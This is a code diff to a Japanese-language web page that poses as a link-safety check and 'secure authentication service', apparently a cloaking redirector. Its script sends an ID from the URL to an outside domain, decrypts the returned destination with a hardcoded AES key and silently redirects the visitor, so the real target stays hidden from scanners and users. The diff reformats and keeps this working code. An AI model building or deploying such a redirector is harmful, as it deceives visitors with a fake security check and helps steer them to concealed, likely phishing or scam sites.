@@ -6,11 +6,18 @@
   <meta name="robots" content="noindex,nofollow">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body { text-align:center; font-family:sans-serif; padding-top:80px; background:#f9f9f9; }
-    .loader { margin:30px auto; border:6px solid #f3f3f3; border-top:6px solid #3498db;
-             border-radius:50%; width:50px; height:50px; animation:spin 1s infinite; }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    .caption { color:#666; font-size:13px; margin-top:10px; }
+    body { text-align: center; font-family: sans-serif; padding-top: 100px; background: #f5f5f5; }
+    .loader {
+      margin: 30px auto;
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #3498db;
+      border-radius: 50%;
+      width: 50px; height: 50px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .caption { color: #888; font-size: 14px; margin-top: 10px; }
+    .error { color: red; margin-top: 20px; }
   </style>
 </head>
 <body>
@@ -18,44 +25,46 @@
   <p>リンクの安全性を確認しています。まもなくリダイレクトします。</p>
   <div class="loader"></div>
   <p class="caption">セキュア認証サービス</p>
+  <p id="error" class="error"></p>
 
   <script>
     const AES_KEY = "5Ctianyoumabiiii";
-    const id = location.pathname.split("/").pop();
-
+    const pathParts = window.location.pathname.split("/").filter(x => x);
+    const id = pathParts[pathParts.length - 1];
+    
     if (!id) {
-      document.body.innerHTML = "<h3>無効なIDです</h3>";
+      document.getElementById("error").textContent = "IDが見つかりません。";
     } else {
       fetch("https://ghwrweh.top/api/jumpSite?siteName=" + encodeURIComponent(id))
         .then(r => r.json())
-        .then(data => {
+        .then(async data => {
           const enc = data?.data?.siteUrl;
-          if (enc) {
-            decryptAES(enc).then(url => {
-              if (url) {
-                setTimeout(() => location.href = url, 3000);
-              } else {
-                document.body.innerHTML += "<p>復号に失敗しました。</p>";
-              }
-            });
-          } else {
-            document.body.innerHTML += "<p>IDが存在しません。</p>";
-          }
+          if (!enc) throw new Error("URLなし");
+
+          const url = await decryptAES(enc);
+          if (!url) throw new Error("復号失敗");
+          setTimeout(() => { location.href = url; }, 2000);
         })
-        .catch(() => {
-          document.body.innerHTML += "<p>サーバーエラーが発生しました。</p>";
+        .catch(e => {
+          document.getElementById("error").textContent = "復号に失敗しました。";
         });
     }
 
     async function decryptAES(encText) {
       try {
-        const b64 = encText.replace(/-/g,'+').replace(/_/g,'/');
-        const bytes = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
-        const iv = bytes.slice(0,16), data = bytes.slice(16);
-        const key = await crypto.subtle.importKey("raw",
-          new TextEncoder().encode(AES_KEY), {name:"AES-CBC"}, false, ["decrypt"]);
-        const dec = await crypto.subtle.decrypt({name:"AES-CBC", iv}, key, data);
-        return new TextDecoder().decode(dec).replace(/\u0000+$/, "");
+        const base64 = encText.replace(/-/g, '+').replace(/_/g, '/');
+        const bytes = Uint8Array.from(atob(base64), c => c.charCodeAt(0));
+        const iv = bytes.slice(0, 16);
+        const data = bytes.slice(16);
+        const key = await crypto.subtle.importKey(
+          "raw",
+          new TextEncoder().encode(AES_KEY),
+          { name: "AES-CBC" },
+          false,
+          ["decrypt"]
+        );
+        const decrypted = await crypto.subtle.decrypt({ name: "AES-CBC", iv }, key, data);
+        return new TextDecoder().decode(decrypted).replace(/\u0000+$/, '');
       } catch {
         return null;
       }
